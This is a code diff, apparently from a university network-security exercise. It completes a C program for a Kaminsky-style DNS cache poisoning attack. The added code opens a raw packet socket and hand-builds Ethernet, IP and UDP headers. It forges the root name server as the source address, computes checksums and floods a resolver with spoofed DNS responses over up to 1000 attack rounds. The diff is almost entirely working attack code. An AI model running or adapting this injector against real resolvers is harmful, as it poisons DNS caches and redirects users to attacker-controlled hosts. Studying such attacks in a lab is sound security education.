@@ -10,10 +10,15 @@
 
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netinet/ether.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <linux/if_packet.h>
 
-#include <pcap.h>
 #include <ldns/ldns.h>
 
 /* =======================
@@ -32,9 +37,13 @@
 #define MAX_LEN_PORT 64
 // send at most 65536*20 spoofed packets in each attack attempt
 #define MAX_SPOOFED_PKTS   (65536 * 20)
+#define MAX_ROUNDS         1000  // Maximum attack rounds to attempt
 
-/* pcap handle for packet injection */
-static pcap_t *g_pcap_handle = NULL;
+/* raw socket for packet injection */
+static int g_raw_sockfd = -1;
+static struct sockaddr_ll g_dest_addr;
+static unsigned char g_src_mac[6];
+static unsigned char g_dest_mac[6];
 
 /* learned resolver source port */
 static uint16_t g_resolver_src_port = 0;
@@ -129,25 +138,180 @@ static int wait_for_resolver_port_over_tcp(int listen_sock)
 
 
 /* =======================
+ *   CHECKSUM FUNCTIONS
+ * ======================= */
+
+/**
+ * calculate_checksum - Calculate Internet checksum (RFC 1071)
+ * @data: Pointer to data buffer
+ * @len: Length of data in bytes
+ * 
+ * Returns: 16-bit checksum value
+ */
+static uint16_t calculate_checksum(const void *data, size_t len)
+{
+    const uint16_t *buf = (const uint16_t *)data;
+    uint32_t sum = 0;
+    
+    while (len > 1) {
+        sum += *buf++;
+        len -= 2;
+    }
+    
+    if (len == 1) {
+        sum += *(const uint8_t *)buf;
+    }
+    
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    
+    return (uint16_t)~sum;
+}
+
+/**
+ * calculate_udp_checksum - Calculate UDP checksum with pseudo-header
+ * @src_ip: Source IP address (network byte order)
+ * @dest_ip: Destination IP address (network byte order)
+ * @udp_hdr: Pointer to UDP header
+ * @udp_len: Total UDP length (header + data)
+ * 
+ * Returns: 16-bit UDP checksum
+ */
+static uint16_t calculate_udp_checksum(uint32_t src_ip, uint32_t dest_ip,
+                                       const struct udphdr *udp_hdr, uint16_t udp_len)
+{
+    struct {
+        uint32_t src_addr;
+        uint32_t dest_addr;
+        uint8_t zero;
+        uint8_t protocol;
+        uint16_t udp_length;
+    } pseudo_header;
+    
+    pseudo_header.src_addr = src_ip;
+    pseudo_header.dest_addr = dest_ip;
+    pseudo_header.zero = 0;
+    pseudo_header.protocol = IPPROTO_UDP;
+    pseudo_header.udp_length = htons(udp_len);
+    
+    uint32_t sum = 0;
+    const uint16_t *buf;
+    
+    // Add pseudo-header
+    buf = (const uint16_t *)&pseudo_header;
+    for (size_t i = 0; i < sizeof(pseudo_header) / 2; i++) {
+        sum += buf[i];
+    }
+    
+    // Add UDP header and data
+    buf = (const uint16_t *)udp_hdr;
+    size_t len = udp_len;
+    while (len > 1) {
+        sum += *buf++;
+        len -= 2;
+    }
+    
+    if (len == 1) {
+        sum += *(const uint8_t *)buf;
+    }
+    
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    
+    return (uint16_t)~sum;
+}
+
+/* =======================
  *   UTILITY FUNCTIONS
  * ======================= */
 
-/* Initialize pcap for packet injection on eth0 (inside container). */
-static int init_pcap(void)
+/**
+ * get_interface_info - Get MAC address and interface index for eth0
+ * @ifname: Interface name (e.g., "eth0")
+ * @mac: Buffer to store MAC address (6 bytes)
+ * @ifindex: Pointer to store interface index
+ * 
+ * Returns: 0 on success, -1 on failure
+ */
+static int get_interface_info(const char *ifname, unsigned char *mac, int *ifindex)
 {
-    /* TODO: open pcap on "eth0" with pcap_open_live, check errors, etc. */
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t *handle;
-    /* set g_pcap_handle on success */
+    struct ifreq ifr;
+    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    
+    if (sockfd < 0) {
+        perror("socket for ioctl");
+        return -1;
+    }
+    
+    memset(&ifr, 0, sizeof(ifr));
+    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
+    
+    // Get MAC address
+    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
+        perror("ioctl SIOCGIFHWADDR");
+        close(sockfd);
+        return -1;
+    }
+    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
+    
+    // Get interface index
+    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
+        perror("ioctl SIOCGIFINDEX");
+        close(sockfd);
+        return -1;
+    }
+    *ifindex = ifr.ifr_ifindex;
+    
+    close(sockfd);
     return 0;
 }
 
-/* Close pcap handle if open. */
-static void cleanup_pcap(void)
+/* Initialize raw socket for packet injection on eth0 (inside container). */
+static int init_raw_socket(void)
 {
-    if (g_pcap_handle != NULL) {
-        pcap_close(g_pcap_handle);
-        g_pcap_handle = NULL;
+    int ifindex;
+    
+    // Create raw socket
+    g_raw_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (g_raw_sockfd < 0) {
+        perror("socket(AF_PACKET)");
+        return -1;
+    }
+    
+    // Get eth0 MAC address and interface index
+    if (get_interface_info("eth0", g_src_mac, &ifindex) < 0) {
+        fprintf(stderr, "Failed to get eth0 interface info\n");
+        close(g_raw_sockfd);
+        g_raw_sockfd = -1;
+        return -1;
+    }
+    
+    printf("eth0 MAC: %02x:%02x:%02x:%02x:%02x:%02x (ifindex=%d)\n",
+           g_src_mac[0], g_src_mac[1], g_src_mac[2],
+           g_src_mac[3], g_src_mac[4], g_src_mac[5], ifindex);
+    
+    // Set destination MAC (resolver's gateway/router MAC - typically need ARP)
+    // For now, use broadcast or set manually if known
+    // TODO: In production, perform ARP lookup for RESOLVER_IP
+    memset(g_dest_mac, 0xff, 6);  // Broadcast for now
+    
+    // Setup sockaddr_ll for sendto
+    memset(&g_dest_addr, 0, sizeof(g_dest_addr));
+    g_dest_addr.sll_family = AF_PACKET;
+    g_dest_addr.sll_ifindex = ifindex;
+    g_dest_addr.sll_halen = ETH_ALEN;
+    memcpy(g_dest_addr.sll_addr, g_dest_mac, 6);
+    
+    printf("Raw socket initialized on eth0\n");
+    return 0;
+}
+
+/* Close raw socket if open. */
+static void cleanup_raw_socket(void)
+{
+    if (g_raw_sockfd >= 0) {
+        close(g_raw_sockfd);
+        g_raw_sockfd = -1;
     }
 }
 
@@ -210,18 +374,79 @@ static int build_spoofed_response(const char *qname,
     return 0;
 }
 
-/* Inject one spoofed packet into the network via pcap. */
-static int inject_spoofed_packet(const uint8_t *buf, size_t len)
+/* Inject one spoofed packet into the network via raw socket. */
+static int inject_spoofed_packet(const uint8_t *dns_data, size_t dns_len)
 {
-    /* TODO:
-     * 1. Build full Ethernet + IP + UDP headers around DNS wire data.
-     * 2. Use pcap_inject() / pcap_sendpacket() with g_pcap_handle.
-     * 3. Make sure source IP is ROOT_NS_IP and dest IP is RESOLVER_IP.
-     * 4. UDP src port = 53, dest port = g_resolver_src_port.
-     * 5. Compute UDP checksum correctly (חובה בתרגיל).
-     */
-    (void)buf;
-    (void)len;
+    unsigned char packet[MAX_BYTES_PER_PACKET];
+    struct ether_header *eth;
+    struct iphdr *ip;
+    struct udphdr *udp;
+    uint8_t *dns_payload;
+    size_t total_len;
+    
+    uint32_t src_ip, dest_ip;
+    
+    // Convert IPs to network byte order
+    inet_pton(AF_INET, ROOT_NS_IP, &src_ip);
+    inet_pton(AF_INET, RESOLVER_IP, &dest_ip);
+    
+    // Calculate sizes
+    size_t eth_len = sizeof(struct ether_header);
+    size_t ip_len = sizeof(struct iphdr);
+    size_t udp_len = sizeof(struct udphdr);
+    total_len = eth_len + ip_len + udp_len + dns_len;
+    
+    if (total_len > MAX_BYTES_PER_PACKET) {
+        fprintf(stderr, "Packet too large: %zu bytes\n", total_len);
+        return -1;
+    }
+    
+    memset(packet, 0, total_len);
+    
+    // === Build Ethernet Header ===
+    eth = (struct ether_header *)packet;
+    memcpy(eth->ether_dhost, g_dest_mac, 6);
+    memcpy(eth->ether_shost, g_src_mac, 6);
+    eth->ether_type = htons(ETHERTYPE_IP);
+    
+    // === Build IP Header ===
+    ip = (struct iphdr *)(packet + eth_len);
+    ip->version = 4;
+    ip->ihl = 5;  // 5 * 4 = 20 bytes (no options)
+    ip->tos = 0;
+    ip->tot_len = htons(ip_len + udp_len + dns_len);
+    ip->id = htons(rand() % 65536);
+    ip->frag_off = 0;
+    ip->ttl = 64;
+    ip->protocol = IPPROTO_UDP;
+    ip->saddr = src_ip;
+    ip->daddr = dest_ip;
+    ip->check = 0;  // Will calculate below
+    ip->check = calculate_checksum(ip, ip_len);
+    
+    // === Build UDP Header ===
+    udp = (struct udphdr *)(packet + eth_len + ip_len);
+    udp->source = htons(DNS_PORT);
+    udp->dest = htons(g_resolver_src_port);
+    udp->len = htons(udp_len + dns_len);
+    udp->check = 0;  // Will calculate below
+    
+    // === Copy DNS payload ===
+    dns_payload = packet + eth_len + ip_len + udp_len;
+    memcpy(dns_payload, dns_data, dns_len);
+    
+    // === Calculate UDP checksum ===
+    udp->check = calculate_udp_checksum(src_ip, dest_ip, udp, udp_len + dns_len);
+    
+    // === Send packet ===
+    ssize_t sent = sendto(g_raw_sockfd, packet, total_len, 0,
+                          (struct sockaddr *)&g_dest_addr, sizeof(g_dest_addr));
+    
+    if (sent < 0) {
+        perror("sendto");
+        return -1;
+    }
+    
     return 0;
 }
 
@@ -274,18 +499,18 @@ int main(void)
       return EXIT_FAILURE;
     }
 
-    printf(" step 2: basic query to our attackerdomain through the resolver"
-           ".\n");
+    printf("Step 2: Initialize raw socket for packet injection\n");
 
-
-    if (init_pcap() != 0) {
+    if (init_raw_socket() != 0) {
         goto cleanup;
     }
 
+    printf("Step 3: Learning resolver source port...\n");
     if (learn_resolver_source_port() != 0) {
         goto cleanup;
     }
 
+    printf("Step 4: Starting Kaminsky attack rounds...\n");
     /* Main Kaminsky-style loop: multiple attack windows with different subdomains. */
     for (int round = 0; round < MAX_ROUNDS; ++round) {
         perform_attack_round(round);
@@ -298,6 +523,7 @@ int main(void)
     }
 
 cleanup:
-    cleanup_pcap();
+    cleanup_raw_socket();
+    close(listen_sock);
     return ret;
 }
